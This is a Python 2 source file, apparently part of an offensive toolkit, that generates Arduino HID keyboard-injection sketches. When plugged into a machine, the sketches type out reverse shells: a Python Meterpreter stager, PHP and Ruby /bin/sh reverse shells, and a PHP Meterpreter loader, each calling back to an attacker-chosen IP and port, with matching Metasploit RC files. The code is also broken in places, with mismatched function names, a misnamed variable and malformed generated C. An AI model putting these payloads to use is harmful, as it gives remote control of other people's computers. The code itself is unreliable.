#!/usr/bin/python
#uses HID-Project.h from https://github.com/NicoHood/HID, can be installed from Arduino Library Manager

import sys
import argparse
import os
import subprocess
import coreUtils


def uniBanner():

  coreUtils.clearScreen()
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "*************************************Universal Payloads*************************************"
  print "************ These Payloads are for OSX and Linux, though some may work on Windows**********"
  print "***********************if the proper scripting language is installed************************"
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "\n"

def UniMenu():

  coreUtils.clearScreen()
  menu = {}
  menu['1']="Python reverse TCP Meterpreter Shell"
  menu['2']="PHP Reverse Shell"
  menu['3']="Ruby Reverse Shell"
  menu['4']="PHP reverse TCP Meterpreter Shell"
  menu['42']="Main Menu"
  
  while True: 
    options=menu.keys()
    options.sort(key=int)
    for entry in options: 
      print entry, menu[entry]

    selection=raw_input("\nPlease Select: ") 
    if selection =='1': 
      UniOption1() 
    elif selection == '2': 
      osxOption2()
    elif selection == '3':
      osxOption3()
    elif selection == '4':
      osxOption4()
    elif selection == '42':
      coreUtils.clearScreen()	
      break
    else: 
      print "\n\n***That is not a valid option!***\n\n"   


def uniWriteFile(filename,payloadFunc,payload):

  buffer = "#include <HID-Project.h>\n"
  buffer += "void setup() {\n"
  buffer += "  Keyboard.begin();\n"
  buffer += "  hurryUp();\n"
  buffer += "  killCaps();\n"
  buffer += "  delay(3000);\n"

  buffer += "  " + payloadFunc

  buffer += "  Keyboard.end();\n"
  buffer += "}\n"

  buffer += "void pressEnter(){\n"
  buffer += "  Keyboard.press(KEY_RETURN);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.release(KEY_RETURN);\n"
  buffer += "}\n"

  buffer += "void hurryUp(){\n"
  buffer += "  boolean areWeThereYet = capsCheck();\n"
  buffer += "  while (areWeThereYet == capsCheck()){\n"
  buffer += "    hitCaps();\n"
  buffer += "  }\n"
  buffer += "  hitCaps();\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "boolean capsCheck(){\n"
  buffer += "  if (BootKeyboard.getLeds() & LED_CAPS_LOCK){\n"
  buffer += "    return true;\n"
  buffer += "  }\n"
  buffer += "  else{\n"
  buffer += "    return false;\n"
  buffer += "  }\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "void hitCaps(){\n"
  buffer += "  Keyboard.press(KEY_CAPS_LOCK);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.release(KEY_CAPS_LOCK);\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "void killCaps(){\n"
  buffer += "  if (capsCheck())\n"
  buffer += "  {\n"
  buffer += "      hitCaps();\n"
  buffer += "  }\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += payload

  buffer += "void loop()\n"
  buffer += "{\n"
  buffer += "}\n"

  fileName = coreUtils.checkINO(fileName)
  file = open(fileName,'w')
  file.write(buffer)
  file.close()


def UniOption1():

  coreUtils.clearScreen()
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "***********************Unversal Python Reverse TCP Meterpreter******************************"
  print "*********** This payload will initiate reverse TCP Meterpreter shell in Python**************"
  print "******************* Options are: 1. remote IP 2. Listening Port ****************************"
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "\n"

  answer = 'N'
  validIP = False
  while answer not in ('Y','y','yes','Yes','YES'):
    

    answer = 'N'
    fileExists = True

    while validIP == False:  
      remoteIP = raw_input("Please enter the IP of the listening server: ")
      validIP = coreUtils.checkIP(remoteIP)
      if validIP == False:
        print "Not a valid IP, try again"

    remotePort = raw_input("Please enter the port the server will be listening on: ")
	
    while fileExists == True:
      fileName = raw_input("Please enter the name of the output file (if left blank the default is \"PythonRevMet.ino\"): ")
      if fileName == "":
        fileName = 'PythonRevMet.ino'
      fileExists = coreUtils.FileCheck(fileName)
	  
    fileExists = True
    while fileExists == True:
      RCfile = raw_input("Please enter the name of the Metasploit RC File (if left blank the default is \"PythonRevMet.rc\"):  ")
      if RCfile == "":
        RCfile = 'PythonRevMet.rc'
      fileExists = coreUtils.FileCheck(fileName)
	  
	  

    print "The IP of  the remote server is:  " + remoteIP
    print "The remote server is listening on port:  " + remotePort
    print "The output filename is:  " + fileName
    print "The name of the Metasploit RC File is:  " + RCfile

    answer = raw_input("Are these settings correct? Y/N: ")
	
  payload = "void reverseMet(){\n"
  payload += "Keyboard.println(\"import socket,struct\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  payload += "Keyboard.println(\"s=socket.socket(2,socket.SOCK_STREAM)\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"  
  payload += "Keyboard.println(\"s.connect(('"+remoteIP+"',"+remotePort+"))\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  payload += "Keyboard.println(\"l=struct.unpack('>I',s.recv(4))[0]\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  payload += "Keyboard.println(\"d=s.recv(l)\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  payload += "Keyboard.println(\"while len(d)<l:\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  payload += "Keyboard.println(\"	d+=s.recv(l-len(d))\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  payload += "Keyboard.println(\"exec(d,{'s':s})\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  
  payloadFunc = "reverseMet();\n"

  coreUtils.msfRCfile(remoteIP,remotePort,'python/meterpreter/reverse_tcp',RCfile)
  uniWriteFile(filename,payloadFunc,payload)
  
def uniOption2():

  coreUtils.clearScreen()
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "************************************PHP Reverse Shell***************************************"
  print "************* This payload will initiate a reverse shell via PHP, requires PHP**************"
  print "******************* Options are: 1. remote IP 2. Listening Port ****************************"
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "\n"

  answer = 'N'
  validIP = False
  while answer not in ('Y','y','yes','Yes','YES'):
    answer = 'N'
    fileExists = True

    while validIP == False:  
      remoteIP = raw_input("Please enter the port the server will be listening on: ")
      validIP = checkIP(remoteIP)
      if validIP == False:
        print "Not a valid IP, try again"
    remotePort = raw_input("Please enter the port the server will be listening on: ")
	
    while fileExists == True:
      fileName = raw_input("Please enter the name of the output file (if left blank the default \"revShellPHP.ino\": ")
      if fileName == "":
        fileName = 'revShellPHP.ino'
      fileExists = coreUtils.FileCheck(fileName)

    print "The IP of  the remote server is:  " + remoteIP
    print "The remote server is listening on port:  " + remotePort
    print "The output filename is:  " + fileName

    answer = raw_input("Are these settings correct? Y/N: ")
  
  payload = "void ReverseShell(){\n"
  payload += "Keyboard.println(\"php -r '$sock=fsockopen(\\\""+remoteIP+"\\\","+remotePort+");exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  
  payloadFunc = "ReverseShell();\n"
  
  uniWriteFile(fileName,payloadFunc, payload)
  
def uniOption3():

  coreUtils.clearScreen()
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "************************************Ruby Reverse Shell**************************************"
  print "************ This payload will initiate a reverse shell via Ruby, requires Ruby*************"
  print "******************* Options are: 1. remote IP 2. Listening Port ****************************"
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "\n"

  answer = 'N'
  validIP = False
  while answer not in ('Y','y','yes','Yes','YES'):
    answer = 'N'
    fileExists = True

    while validIP == False:  
      remoteIP = raw_input("Please enter the port the server will be listening on: ")
      validIP = checkIP(remoteIP)
      if validIP == False:
        print "Not a valid IP, try again"
    remotePort = raw_input("Please enter the port the server will be listening on: ")
	
    while fileExists == True:
      fileName = raw_input("Please enter the name of the output file (if left blank the default \"revShellRuby.ino\": ")
      if fileName == "":
        fileName = 'revShellRuby.ino'
      fileExists = coreUtils.FileCheck(fileName)

    print "The IP of  the remote server is:  " + remoteIP
    print "The remote server is listening on port:  " + remotePort
    print "The output filename is:  " + fileName

    answer = raw_input("Are these settings correct? Y/N: ")
  
  payload = "void ReverseShell(){\n"
  payload += "Keyboard.println(\"ruby -rsocket -e'f=TCPSocket.open(\\\""+remoteIP+"\\\","+remotePort+").to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  
  payloadFunc = "ReverseShell();\n"
  
  uniWriteFile(fileName,payloadFunc, payload)
  
  
def uniOption4():

  coreUtils.clearScreen()
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "******************************PHP Meterpreter Reverse TCP***********************************"
  print "********* This payload will initiate a meterpreter/reverse_tcp via PHP, requires PHP********"
  print "******************* Options are: 1. remote IP 2. Listening Port ****************************"
  print "********************************************************************************************"
  print "********************************************************************************************"
  print "\n"

  answer = 'N'
  validIP = False
  while answer not in ('Y','y','yes','Yes','YES'):

    answer = 'N'
    fileExists = True

    while validIP == False:  
      remoteIP = raw_input("Please enter the port the server will be listening on: ")
      validIP = checkIP(remoteIP)
      if validIP == False:
        print "Not a valid IP, try again"
    remotePort = raw_input("Please enter the port the server will be listening on: ")
	
    while fileExists == True:
      fileName = raw_input("Please enter the name of the output file (if left blank the default \"revMetPHP.ino\": ")
      if fileName == "":
        fileName = 'revMetPHP.ino'
      fileExists = coreUtils.FileCheck(fileName)
	  
    fileExists = True
    while fileExists == True:
      RCfile = raw_input("Please enter the name of the Metasploit RC File (if left blank the default is \"revMetPHP.rc\"):  ")
      if RCfile == "":
        RCfile = 'revMetPHP.rc'
      fileExists = coreUtils.FileCheck(fileName)

    print "The IP of  the remote server is:  " + remoteIP
    print "The remote server is listening on port:  " + remotePort
    print "The output filename is:  " + fileName

    answer = raw_input("Are these settings correct? Y/N: ")
  
  payload = "void ReverseShell(){\n"
  payload += "Keyboard.println(\"php -r 'error_reporting(0); $ip = \\\""+remoteIP+"\\\"; $port = "+remotePort+"; if (($f = \\\"stream_socket_client\\\") && is_callable($f)) { $s = $f(\\\"tcp://{$ip}:{$port}\\\");"
  payload += "  $s_type = \\\"stream\\\"; } elseif (($f = \\\"fsockopen\\\") && is_callable($f)) { $s = $f($ip, $port); $s_type = \\\"stream\\\"; } elseif (($f = \\\"socket_create\\\") && is_callable($f))"
  payload += "  { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = \\\"socket\\\"; } else { die(\\\"no socket funcs\\\"); } if (!$s) { die(\\\"no socket\\\");"
  payload += "  } switch ($s_type) { case \\\"stream\\\": $len = fread($s, 4); break; case \\\"socket\\\": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\\\"Nlen\\\", $len); $len = $a[\\\"len\\\"];"
  payload += "  $b = \\\"\\\"; while (strlen($b) < $len) { switch ($s_type) { case \\\"stream\\\": $b .= fread($s, $len-strlen($b)); break; case \\\"socket\\\": $b .= socket_read($s, $len-strlen($b)); break;"
  payload += "  } } $GLOBALS[\\\"msgsock\\\"] = $s; $GLOBALS[\\\"msgsock_type\\\"] = $s_type; eval($b); die();'\");\n"
  payload += "  pressEnter();\n"
  payload += "}\n"
  
  payloadFunc = "ReverseShell();\n"
  
  uniWriteFile(fileName,payloadFunc, payload)
  coreUtils.msfRCfile(remoteIP,remotePort,'php/meterpreter/reverse_tcp',RCfile)